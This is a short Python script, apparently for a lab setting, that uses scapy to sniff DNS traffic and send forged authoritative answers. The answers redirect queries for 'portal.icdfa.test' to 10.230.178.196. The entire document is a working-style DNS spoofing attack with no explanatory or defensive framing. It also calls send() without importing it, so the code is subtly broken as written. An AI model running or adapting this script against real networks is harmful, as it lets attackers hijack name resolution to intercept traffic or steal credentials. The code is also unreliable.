#!/usr/bin/env python3
import sys
from scapy.all import sniff, IP, UDP, DNS, DNSRR

def spoof_dns(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        qname = pkt[DNS].qd.qname.decode('utf-8')
        if "portal.icdfa.test" in qname:
            print(f"[*] Spoofing DNS request for {qname}")
            spf_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/ \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/ \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=5, rdata="10.230.178.196"))
            send(spf_pkt, verbose=False)

print("[*] Listening for DNS queries...")
sniff(filter="udp port 53", prn=spoof_dns, timeout=30)
